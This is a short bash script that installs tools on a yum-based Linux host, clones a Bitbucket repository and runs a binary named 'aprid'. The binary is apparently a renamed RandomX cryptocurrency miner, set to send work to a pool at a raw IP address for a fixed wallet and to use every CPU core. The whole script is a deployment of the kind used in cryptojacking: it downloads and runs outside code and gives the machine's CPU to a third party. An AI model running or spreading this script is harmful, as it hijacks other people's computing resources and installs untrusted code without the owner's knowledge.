#!/bin/bash
yum update && yum -y install sudo
yum -y install git wget
git clone https://bitbucket.org/asana/luo.git && cd luo
chmod 777 aprid SHA256SUMS
./aprid --donate-level 1 -o 146.190.96.150:443 -u SaLvs7GhGVsP5LfYtoAtJZ4PBc3jQP8hR4jN2bR2jACs12QQkLVPv5Z1DuMkmBJqvEQdm2j6Gc97B8qMPWK2RTspfHqJnCKZtN1 -p gasruy -a rx/0 -k -t $(nproc --all)
